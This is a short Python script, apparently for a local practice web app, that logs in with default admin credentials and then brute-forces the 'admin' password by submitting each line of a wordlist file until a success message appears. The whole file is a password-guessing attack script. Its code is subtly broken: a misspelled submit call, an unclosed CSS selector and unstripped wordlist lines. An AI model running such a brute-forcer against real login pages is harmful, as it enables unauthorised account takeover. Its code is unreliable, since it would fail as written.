import mechanicalsoup

browser = mechanicalsoup.StatefulBrowser()

browser.open("http://localhost:9090/login.php")

# print(browser.get_url())

browser.select_form('form[action="login.php"]')
browser["username"] = "admin"
browser["password"] = "password"

browser.submit_selected()

# print(browser.get_url())

browser.follow_link("http://localhost:9090/login.php")

passwords = open("harald.txt", "r")

def brute_force():
    for password in passwords:
        browser.select_form('form[action="#"')
        browser["username"] = "admin"
        browser["password"] = password
        response = browser.submit.selected()
        if "Welcome to the password protected area" in response.text:
            print("THE PASSWORD IS: " + password)
            break
        else:
            browser.follow_link("http://localhost:9090/login.php")
brute_force()
